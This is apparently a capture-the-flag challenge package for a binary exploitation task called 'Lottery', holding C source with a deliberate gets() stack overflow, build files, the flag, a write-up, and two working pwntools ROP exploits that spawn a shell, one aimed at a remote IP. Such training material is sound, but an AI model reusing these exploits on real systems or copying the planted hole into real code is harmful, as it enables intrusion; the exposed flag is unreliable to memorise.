{
    "0c154780-2091-11eb-9d0e-46cbe9ff8dd7.png": "[Binary file or unsupported type: png]",
    "7f6a8980-2090-11eb-9415-b5c86cf62423.png": "[Binary file or unsupported type: png]",
    "86de6280-2091-11eb-8e48-03b5111998c2.png": "[Binary file or unsupported type: png]",
    "b5a80900-2090-11eb-9fbf-18ef90692ca0.png": "[Binary file or unsupported type: png]",
    "challenge.py": "from hacksport.operations import execute\nfrom hacksport.problem import Challenge, File\n\n\nclass Problem(Challenge):\n    def setup(self):\n        self.files = []\n\n    def generate_flag(self, random):\n        return r\"gigem{3x3cu74bl3_rn6}\"\n",
    "Dockerfile": "FROM alpine as build\n\nRUN apk add --update alpine-sdk\nADD lottery.c /tmp/lottery.c\nADD Makefile /tmp/Makefile\nRUN cd /tmp/; make all\n\nFROM debian\n\nRUN apt-get update -y; apt-get install socat -y\nCOPY --from=build /tmp/lottery /pwn/lottery\nCOPY flag.txt /pwn/flag.txt\nADD solve.py /pwn/solve.py\nWORKDIR /pwn\n\nEXPOSE 5906\n\nENTRYPOINT [\"sh\", \"-c\", \"exec socat -s TCP-LISTEN:5906,reuseaddr,fork EXEC:/pwn/lottery,stderr\"]\n",
    "e720d480-2090-11eb-8c0e-50fc820f412f.png": "[Binary file or unsupported type: png]",
    "flag.txt": "gigem{3x3cu74bl3_rn6}",
    "lottery.c": "#include <stdlib.h>\n#include <time.h>\n#include <stdio.h>\n#include <sys/mman.h>\n#include <sys/types.h>\n#include <sys/stat.h>\n#include <fcntl.h>\n#include <string.h>\nint* WINNING_NUMBERS;\nint* ENTERED_NUMBERS;\n\n\nvoid seed() {\n\tsrand(time(0) ^ 0xc35ac35f);\n}\n\nvoid generate_winning_numbers() {\n\tint r = 0;\n\tfor(int i = 0; i < 16; i++) {\n\t\tr = rand();\n\t\t*(WINNING_NUMBERS + i) = r;\n\t}\n}\n\nvoid print_winning_numbers() {\n\tfor(int i = 0; i < 16; i++) {\n\t\tprintf(\"%X \", *(WINNING_NUMBERS + i));\n\t}\n\tprintf(\"\\n\");\n}\n\nvoid print_entered_numbers() {\n\tfor(int i = 0; i < 16; i++) {\n\t\tprintf(\"%X \", *(ENTERED_NUMBERS + i));\n\t}\n\tprintf(\"\\n\");\n}\n\n\nvoid cheat() {\n\tmemcpy(ENTERED_NUMBERS, WINNING_NUMBERS, 64);\n}\n\nvoid __attribute__ ((noinline)) protect(int address) {\n\tmprotect(address, 64, PROT_READ | PROT_WRITE);\n}\n\nvoid query_numbers() {\n\tfor(int i = 0; i < 16; i++) {\n\t\tprintf(\"Enter number %d: \", i+1);\n\t\tscanf(\"%x\",ENTERED_NUMBERS + i);\n\t\tfgetc(stdin); // consume newline\n\t}\n}\n\nvoid check_numbers() {\n\tprintf(\"You entered: \");\n\tprint_entered_numbers();\n\tprintf(\"Winning numbers: \");\n\tprint_winning_numbers();\n\tfor(int i = 0; i < 16; i++) {\n\t\tif(*(ENTERED_NUMBERS + i) != *(WINNING_NUMBERS + i)) {\n\t\t\tprintf(\"You didn't win, feel free to try again!\\n\");\n\t\t\texit(1);\n\t\t}\n\t}\n\tprintf(\"You win!  Congratulations! Winning isn't enough to get you the flag though. \\n\");\n\texit(0);\n}\n\nvoid __attribute__ ((noinline)) ask_name() {\n\tchar name[64];\n\tgets(name);\n\tprintf(\"Hi, %s!\\n\", name);\n}\n\nint menu() {\n\twhile(1) {\n\t\tprintf(\"1. Enter Numbers\\n2. Check Numbers\\n3. Enter Name\\nAction: \");\n\t\tchar action_buf[8];\n\t\tfgets(action_buf, 7, stdin);\n\t\tif(strcmp(action_buf,\"1\\n\") == 0) {\n\t\t\tquery_numbers();\n\t\t} else if(strcmp(action_buf,\"2\\n\") == 0) {\n\t\t\tcheck_numbers();\n\t\t} else if (strcmp(action_buf,\"3\\n\") == 0) {\n\t\t\task_name();\n\t\t} else if (strcmp(action_buf,\"1337\\n\") == 0) {\n\t\t\tcheat();\n\t\t} else {\n\t\t\tprintf(\"You didn't enter a valid command, try again! \\n\");\n\t\t}\n\t}\n\n}\n\nint main() {\n\tsetvbuf(stdout, NULL, _IONBF, 0);\n\tWINNING_NUMBERS = mmap(0x10000000,64, 0, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0); // 16 ints\n\tENTERED_NUMBERS = mmap(0x20000000,64, 0, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0); // 16 ints\n\tprotect(WINNING_NUMBERS);\n\tprotect(ENTERED_NUMBERS);\n\tseed();\n\tgenerate_winning_numbers();\n\tmenu();\n}",
    "Makefile": "CC := $(or $(CC),gcc)\nCFLAGS := -O2 -static -no-pie -fno-stack-protector\nCONTAINER := lottery\n\nall: lottery\n\nclean: .PHONY\n\trm -f lottery\n\nlottery: lottery.c\n\t$(CC) $(CFLAGS) $^ -o $@\n\ndocker: Dockerfile lottery\n\tdocker build -t $(CONTAINER) .\n\nrun: docker\n\tdocker run --rm -ti --name lottery -p 5906:5906 lottery\n\nextract: docker\n\t$(eval id := $(shell docker create $(CONTAINER)))\n\tdocker cp $(id):/pwn/lottery - | tar xv lottery\n\tdocker rm -v $(id)\n\n.PHONY:\n",
    "problem.json": "{\n  \"name\": \"Lottery\",\n  \"category\": \"Pwn\",\n  \"description\": \"Attack this binary and get the flag!\\n<a href='http://tamuctf.com/static-files/lottery'>lottery</a>\\n<code>openssl s_client -connect tamuctf.com:443 -servername lottery -quiet</code>\",\n  \"score\" : 200,\n  \"hints\": [\"\"],\n  \"walkthrough\": \"N/A\",\n  \"author\": \"Teddy Heinen\",\n  \"organization\": \"TAMUctf\",\n  \"event\": \"TAMUctf\"\n}\n\n",
    "README.md": "# lottery\n\n## Description\n\nAttack this binary and get the flag!\n\n```nc challenges.tamuctf.com 5906```\n\n## Solution\n\n`gigem{3x3cu74bl3_rn6}`\n\nExcept I didn't make the rng executable, whoops!\n\nTo start, I looked at main, and we see the creation of two maps:\n\n![figur\u00eb](7f6a8980-2090-11eb-9415-b5c86cf62423.png)\n\nThese maps are read/write only, so we can't use them for executing code (at least at first):\n\n![figur\u00eb](b5a80900-2090-11eb-9fbf-18ef90692ca0.png)\n\nWe then enter this menu with a whole mess of options:\n\n![figur\u00eb](e720d480-2090-11eb-8c0e-50fc820f412f.png)\n\nA Ghidra plugin I use noted that there was a `gets` call in `ask_name`, so I looked further into that:\n\n![figur\u00eb](0c154780-2091-11eb-9d0e-46cbe9ff8dd7.png)\n\nOkay, so we have a ROP entry point. Bonus round: we have a region of memory which we know to be allocated (the two maps we saw earlier in main). Bonus bonus: it looks like we can enter numbers into the ENTERED_NUMBERS map (as the program checks whether or not we actually won the lottery):\n\n![figur\u00eb](86de6280-2091-11eb-8e48-03b5111998c2.png)\n\n(Amusingly, I never found where the map is actually written to but it doesn't really matter for our purposes)\n\nThus, our chain is:\n\n1. make the ENTERED_NUMBERS map rwx\n2. write shellcode into ENTERED_NUMBERS\n3. jump to ENTERED_NUMBERS\n4. profit\n\n```python\nfrom pwn import *\n\ncontext.terminal = ['tilix', '-e']\ncontext.arch = \"x86_64\"\n\nelf = ELF(\"./lottery\")\nrop = ROP(elf)\n\n# depth of the stack + extrapop in ask_name\ndepth = 0x48\n\npop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]\npop_rsi = rop.find_gadget(['pop rsi', 'ret'])[0]\npop_rdx = rop.find_gadget(['pop rdx', 'ret'])[0]\nmprotect = elf.symbols['__mprotect']\nmenu = elf.symbols['menu']\njmp_rdx = next(elf.search(asm('jmp rdx')))\n\n# mprotect ENTERED_NUMBERS to rwx\n# fill to stack + extrapop depth\nmprotect_chain = cyclic(depth)\n# rdi = 0x20000000 = ENTERED_NUMBERS\nmprotect_chain += p64(pop_rdi) + p64(0x20000000)\n# rsi = 0x40\nmprotect_chain += p64(pop_rsi) + p64(0x40)\n# rdx = 0x7 = PROT_READ | PROT_WRITE | PROT_EXEC\nmprotect_chain += p64(pop_rdx) + p64(0x7)\n# mprotect()\nmprotect_chain += p64(mprotect)\n# menu()\nmprotect_chain += p64(menu)\n\n# shellcode!\nshellcode = asm(shellcraft.amd64.linux.sh())\n# and some padding\nshellcode = shellcode + b\"\\0\" * (0x40 - len(shellcode))\n\n# invoke shellcode by jumping to ENTERED_NUMBERS\n# fill to stack + extrapop depth\nshellcode_chain = cyclic(depth)\n# rdx = 0x20000000 = ENTERED_NUMBERS\nshellcode_chain += p64(pop_rdx) + p64(0x20000000)\n# jmp ENTERED_NUMBERS\nshellcode_chain += p64(jmp_rdx)\n\n# p = elf.debug(gdbscript=\"break gets\\ncontinue\\nfinish\")\np = remote(\"34.123.3.89\", 5906)\n# p = elf.process()\n\n# enter our \"name\" for mprotect chain\np.recvuntil(\"Action: \")\np.sendline(b\"3\")\np.sendline(mprotect_chain)\n\n# enter our \"numbers\"\np.recvuntil(\"Action: \")\np.sendline(b\"1\")\nfor i in range(0, 16):\n    p.recvuntil(\"Enter number \" + str(i+1) + \": \")\n    # turn 4 bytes of shellcode into an integer\n    num = struct.unpack(\"<L\", shellcode[:4])[0]\n    shellcode = shellcode[4:]\n    # input of program is in hex\n    p.sendline(hex(num))\n\n# enter our \"name\" for our shellcode execution chain\np.recvuntil(\"Action: \")\np.sendline(b\"3\")\np.sendline(shellcode_chain)\np.recvline()\n\n# shell acquired\np.interactive()\n```\n",
    "solve.py": "from pwn import *\nimport re\nimport sys\ncontext.terminal = ['termite','-e']\n\nelf = ELF(\"./lottery\")\n\nrop = ROP(elf)\n\npop_rdi = (rop.find_gadget(['pop rdi', 'ret']))[0]\npop_rdx = (rop.find_gadget(['pop rdx', 'ret']))[0]\npop_rax = (rop.find_gadget(['pop rax', 'ret']))[0]\n\nadd_rdi_rsp_seed = 0xba0a79 ^ 0xc35ac35f\nother_seed = 0x6730b ^ 0xc35ac35f\n\nadd_rdi_rsp = 0x20000000 + 0x1f\nsyscall = 0x10000000 + 0x1d\npop_rsi = 0x10000000 + 0x2b\n\np = remote(\"localhost\",4444)\n\ndef send_payload(payload):\n\tbuf = b\"A\" * 64 + p64(0)\n\tbuf += payload\n\tbuf += p64(elf.symbols['ask_name'])\n\tp.sendline(buf)\n\tp.recvline()\n\n\ndef make_executable(address):\n\tbuf = b\"\"\n\tbuf += p64(pop_rdx)\n\tbuf += p64(7)\n\tbuf += p64(pop_rdi)\n\tbuf += p64(address)\n\tbuf += p64(elf.symbols['protect']+8)\n\tbuf += p64(elf.symbols['ask_name'])\n\tsend_payload(buf)\n\ndef set_seed(seed):\n\tbuf = p64(pop_rdi)\n\tbuf += p64(seed)\n\tbuf += p64(elf.symbols['seed']+17)\n\tbuf += p64(elf.symbols['generate_winning_numbers'])\n\tsend_payload(buf)\n\t\n\ndef fill_buffers():\n\tset_seed(add_rdi_rsp_seed)\n\tsend_payload(p64(elf.symbols['cheat']))\n\tset_seed(other_seed)\n\np.sendline(\"3\")\n\nmake_executable(0x10000000)\nmake_executable(0x20000000)\nfill_buffers()\n\nbuf = p64(pop_rax) + p64(59)\nbuf += p64(pop_rsi) + p64(0)\nbuf += p64(pop_rdx) + p64(0)\nbuf += p64(pop_rdi) + p64(8)\nbuf += p64(add_rdi_rsp)\nbuf += p64(syscall) + b\"/bin/sh\" + p64(0)\nsend_payload(buf)\np.sendline(\"cat flag.txt;exit\")\nprint(\"flag:\", re.search(b\"gigem{.*}\", p.recvall()).group(0).decode('ascii'))\n",
    "category": "pwn"
}